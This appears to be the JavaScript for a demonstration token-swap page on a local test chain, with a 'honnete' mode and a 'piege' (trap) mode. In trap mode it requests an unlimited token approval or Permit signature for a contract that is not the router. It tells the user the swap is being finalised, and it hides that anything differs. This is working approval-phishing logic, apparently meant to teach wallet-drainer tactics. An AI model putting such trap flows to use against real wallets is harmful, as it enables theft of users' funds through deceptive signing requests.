// Logique de la page d'echange. Depend de chain-utils.js (charge avant).
//
// Un seul formulaire, un seul bouton. Deux versions du MEME site, choisies par ?mode= :
//   ?mode=honnete           -> approve de 50 DUSDC EXACTEMENT au routeur, puis l'echange
//   ?mode=piege             -> approve ILLIMITE vers un contrat qui n'est pas le routeur
//   ?mode=piege&via=permit  -> signature Permit illimitee vers ce meme contrat
// Les deux demandes ont l'air normales pour un portefeuille : seule l'intention ecrite revele l'ecart.
//
// Regle d'affichage : aucun nom de fichier, aucune commande, aucun detail technique a l'ecran.
// Rien a l'ecran ne nomme le mode ni ne parle de la demo.
"use strict";

(function () {
  var $ = function (id) { return document.getElementById(id); };
  var AMOUNT_USDC = 50; // montant affiche et demande
  var addresses = null;
  var account = null;

  var params = new URL(location.href).searchParams;
  var MODE = (params.get("mode") || "honnete").toLowerCase();
  if (MODE !== "piege") MODE = "honnete";
  var VIA = (params.get("via") || "").toLowerCase();

  function setState(text, cls) {
    var row = $("state");
    row.className = "state" + (cls ? " " + cls : "");
    row.querySelector(".text").textContent = text;
  }
  function setNet(text, cls) {
    var n = $("net");
    n.className = "net" + (cls ? " " + cls : "");
    $("net-text").textContent = text;
  }

  async function checkNet(p) {
    try {
      var c = await p.request({ method: "eth_chainId" });
      var ok = BigInt(c) === BigInt(addresses.chainId);
      setNet(ok ? "Reseau connecte" : "Mauvais reseau", ok ? "ok" : "bad");
      return ok;
    } catch (e) { setNet("Reseau inconnu", "bad"); return false; }
  }

  async function ensureChain(p) {
    var hex = toHex(addresses.chainId);
    var cur = await p.request({ method: "eth_chainId" });
    if (BigInt(cur) === BigInt(addresses.chainId)) return true;
    try {
      await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: hex }] });
      return true;
    } catch (err) {
      if (err && (err.code === 4902 || /unrecognized/i.test(err.message || ""))) {
        await p.request({
          method: "wallet_addEthereumChain",
          params: [{
            chainId: hex, chainName: "Chaine locale de demo",
            nativeCurrency: { name: "Avalanche", symbol: "AVAX", decimals: 18 },
            rpcUrls: [addresses.rpcUrl], blockExplorerUrls: [],
          }],
        });
        return true;
      }
      throw err;
    }
  }

  async function readNonce(p, owner) {
    try {
      var r = await p.request({ method: "eth_call", params: [{ to: addresses.usdc, data: callData("nonces(address)", [encAddr(owner)]) }, "latest"] });
      return BigInt(r).toString();
    } catch (e) { return "0"; }
  }

  async function doHonest(p) {
    setState("Confirmez l'autorisation de " + AMOUNT_USDC + " DUSDC.", "");
    await p.request({ method: "eth_sendTransaction", params: [txApproveRouter(addresses, account, AMOUNT_USDC)] });
    setState("Confirmez l'echange.", "");
    await p.request({ method: "eth_sendTransaction", params: [txSwap(addresses, account, AMOUNT_USDC)] });
    setState("Echange effectue. Vous avez recu de l'AVAX.", "ok");
  }

  async function doTrapApprove(p) {
    setState("Confirmez l'autorisation pour finaliser l'echange.", "");
    await p.request({ method: "eth_sendTransaction", params: [txApproveUnlimited(addresses, account)] });
    setState("Echange en cours de finalisation.", "ok");
  }

  async function doTrapPermit(p) {
    var nonce = await readNonce(p, account);
    var typed = buildPermit(addresses, account, nonce);
    setState("Signez pour finaliser l'echange (gratuit, sans transaction).", "");
    await p.request({ method: "eth_signTypedData_v4", params: [account, JSON.stringify(typed)] });
    setState("Echange en cours de finalisation.", "ok");
  }

  function run(p) {
    if (MODE === "piege") return VIA === "permit" ? doTrapPermit(p) : doTrapApprove(p);
    return doHonest(p);
  }

  $("btn-swap").addEventListener("click", async function () {
    var p = getProvider();
    if (!p) return;
    var btn = $("btn-swap");
    btn.disabled = true;
    try {
      if (!account) {
        setState("Connexion en cours.", "");
        var accts = await p.request({ method: "eth_requestAccounts" });
        account = accts[0];
        await ensureChain(p);
        await checkNet(p);
        $("acct").textContent = "Connecte : " + shortAddr(account);
        btn.textContent = "Echanger";
        setState("Pret a echanger " + AMOUNT_USDC + " DUSDC contre de l'AVAX.", "");
        btn.disabled = false;
        return;
      }
      if (!(await checkNet(p))) { setState("Mauvais reseau. Reconnectez votre portefeuille.", "bad"); btn.disabled = false; return; }
      await run(p);
    } catch (err) {
      var cancelled = err && (err.code === 4001 || /user rejected|denied/i.test(err.message || ""));
      setState(cancelled ? "Operation annulee." : "Operation impossible pour le moment. Reessayez.", "bad");
      btn.disabled = false;
    }
  });

  async function init() {
    var res = await loadAddresses();
    if (!res.ok) {
      setNet("Service indisponible", "bad");
      $("btn-swap").textContent = "Indisponible pour le moment";
      setState("Service momentanement indisponible. Merci de reessayer plus tard.", "bad");
      return;
    }
    addresses = res.data;
    setTimeout(async function () {
      var p = getProvider();
      if (!p) {
        setNet("Aucun portefeuille", "bad");
        $("btn-swap").textContent = "Aucun portefeuille detecte";
        setState("Installez un portefeuille compatible, puis rechargez cette page.", "bad");
        return;
      }
      $("btn-swap").disabled = false;
      $("btn-swap").textContent = "Connecter le portefeuille";
      setState("Connectez votre portefeuille pour echanger.", "");
      await checkNet(p);
      try { p.on && p.on("chainChanged", function () { checkNet(p); }); } catch (e) {}
    }, 250);
  }

  init();
})();
